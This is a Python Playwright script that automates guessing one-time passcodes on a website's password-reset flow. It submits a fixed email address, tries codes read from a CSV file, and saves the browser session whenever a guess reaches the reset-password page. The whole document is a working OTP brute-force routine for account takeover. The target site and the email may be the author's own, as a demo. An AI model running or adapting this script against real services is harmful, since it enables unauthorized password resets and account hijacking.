import csv
import time
import asyncio
from playwright.async_api import async_playwright

URL1="https://inventory.teamrabbil.com/sendOtp"
URL2="https://inventory.teamrabbil.com/verifyOtp"

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False)
        context = await browser.new_context() # User Agent, # Proxy
        page = await context.new_page()

        # Step 01 Email Page
        await page.goto(URL1, wait_until="load")
        await page.fill("#email", "engr.rabbil@yahoo.com")
        await page.get_by_text("NEXT").click()

        await page.wait_for_url("**/verifyOtp", timeout=3000)

        # Step 02 OTP Page
        await page.goto(URL2,wait_until="load")


        with open("otp.csv",newline="",encoding="utf-8") as csvfile:
            reader = csv.reader(csvfile)
            next(reader,None) # Skip Header

            #
            for i,row in enumerate(reader):
                if i>=6:
                    break

                otp = row[0].strip()

                await page.fill("#otp",otp)

                try:
                    await page.get_by_text("NEXT").click()
                    await page.wait_for_url("**/resetPassword",timeout=3000)
                    print(f"Success {i}. {otp}")
                    await context.storage_state(path=f"otp-{i}.json")

                except Exception:
                    print(f"Fail {i}. {otp}")


                await page.goto(URL2,wait_until="load")
                time.sleep(1)


        await browser.close()



asyncio.run(main())















